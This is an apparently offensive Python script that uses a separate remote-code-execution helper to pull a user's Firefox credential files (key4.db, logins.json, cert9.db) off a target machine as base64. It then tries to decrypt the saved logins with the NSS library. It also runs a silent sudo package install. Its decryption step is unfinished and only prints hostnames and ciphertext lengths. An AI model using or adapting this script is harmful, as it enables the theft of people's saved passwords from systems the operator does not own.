#!/usr/bin/env python3
"""Decrypt Firefox saved credentials from key4.db + logins.json"""
import sqlite3, json, os, sys, struct, base64, shutil, tempfile
from ctypes import *
from ctypes.util import find_library

# NSS libraries
nss_path = None
for p in ['/usr/lib/x86_64-linux-gnu/libnss3.so', '/usr/lib64/libnss3.so', '/usr/lib/libnss3.so']:
    if os.path.exists(p):
        nss_path = p
        break

if not nss_path:
    print("libnss3 not found, installing...")
    os.system("sudo apt-get install -y libnss3 2>/dev/null")

nss = cdll.LoadLibrary(find_library("nss3") or "libnss3.so")
pld = cdll.LoadLibrary(find_library("plds4") or "libplds4.so")
plc = cdll.LoadLibrary(find_library("plc4") or "libplc4.so")
nspr = cdll.LoadLibrary(find_library("nspr4") or "libnspr4.so")

def extract_key(green_pipe_path):
    """Extract 3DES key from Firefox key4.db using sqlcipher or plain sqlite"""
    tmp = tempfile.mkdtemp()
    for f in ['key4.db', 'cert9.db']:
        src = os.path.join(green_pipe_path, f)
        if os.path.exists(src):
            shutil.copy2(src, os.path.join(tmp, f))
    
    db = sqlite3.connect(os.path.join(tmp, 'key4.db'))
    c = db.cursor()
    
    # Check if encrypted
    c.execute("SELECT item1, item2 FROM nssPrivate")
    rows = c.fetchall()
    for row in rows:
        item1, item2 = row
        print(f"  nssPrivate row: item1={item1[:20]}... item2 type={type(item2)}")
    
    # Check meta data
    c.execute("SELECT * FROM metadata")
    meta = c.fetchall()
    for m in meta:
        print(f"  metadata: {m}")
    
    db.close()
    shutil.rmtree(tmp)
    return None

# Alternative: just use the sqlcipher approach or check if no master password
print("Firefox decrypt - checking key4.db structure...")

firefox_dir = sys.argv[1] if len(sys.argv) > 1 else "/tmp/.ff_profile"

# Get key4.db via RCE
import subprocess
def rce(cmd):
    script = os.path.join(os.path.dirname(__file__), 'rce.py')
    r = subprocess.run(['python3', script, cmd], capture_output=True, text=True, timeout=15)
    return r.stdout.strip()

print("Downloading key4.db...")
os.makedirs(firefox_dir, exist_ok=True)

# Download key4.db
data = rce("base64 /home/user/.firefox/b5w4643p.default-release/key4.db")
with open(os.path.join(firefox_dir, 'key4.db'), 'wb') as f:
    f.write(base64.b64decode(data))

# Download logins.json  
data = rce("base64 /home/user/.firefox/b5w4643p.default-release/logins.json")
with open(os.path.join(firefox_dir, 'logins.json'), 'wb') as f:
    f.write(base64.b64decode(data))

# Download cert9.db
data = rce("base64 /home/user/.firefox/b5w4643p.default-release/cert9.db")
with open(os.path.join(firefox_dir, 'cert9.db'), 'wb') as f:
    f.write(base64.b64decode(data))

# Download secmod.db if exists
try:
    data = rce("base64 /home/user/.firefox/b5w4643p.default-release/secmod.db")
    with open(os.path.join(firefox_dir, 'secmod.db'), 'wb') as f:
        f.write(base64.b64decode(data))
except:
    pass

print(f"Files downloaded to {firefox_dir}")

# Try to decrypt using NSS directly
db = sqlite3.connect(os.path.join(firefox_dir, 'key4.db'))
c = db.cursor()

# Check what tables exist
c.execute("SELECT name FROM sqlite_master WHERE type='table'")
tables = c.fetchall()
print(f"Tables: {[t[0] for t in tables]}")

# Check nssPrivate for the key
c.execute("SELECT a11, a102 FROM nssPrivate")
for row in c.fetchall():
    a11, a102 = row
    if a11:
        print(f"  Private key entry found, a11 type: {type(a11)}, len: {len(a11) if isinstance(a11, (bytes, str)) else 'N/A'}")
    if a102:
        print(f"  a102: {a102[:50] if isinstance(a102, str) else a102}")

# Check meta data
c.execute("SELECT * FROM metadata")
meta = c.fetchall()
for m in meta:
    print(f"  metadata: {m[0]} = {m[1][:50] if isinstance(m[1], str) else m[1]}")

db.close()

# Now try NSS init
print("\nTrying NSS initialization...")
profile_path = firefox_dir.encode()
os.environ['LD_LIBRARY_PATH'] = os.environ.get('LD_LIBRARY_PATH', '') + ':/usr/lib/x86_64-linux-gnu'

rv = nss.NSS_Init(profile_path)
print(f"NSS_Init: {rv}")

if rv == 0:
    # Try to read the logins
    with open(os.path.join(firefox_dir, 'logins.json')) as f:
        logins = json.load(f)
    
    for login in logins.get('logins', []):
        enc_user = base64.b64decode(login['encryptedUsername'])
        enc_pass = base64.b64decode(login['encryptedPassword'])
        
        # Create PK11 context
        # This is complex with ctypes, let's try a simpler approach
        print(f"\n  URL: {login['hostname']}")
        print(f"  Encrypted username length: {len(enc_user)}")
        print(f"  Encrypted password length: {len(enc_pass)}")
    
    nss.NSS_Shutdown()
else:
    print("NSS_Init failed")
    # Try with empty profile  
    rv = nss.NSS_InitNoDB(profile_path)
    print(f"NSS_InitNoDB: {rv}")

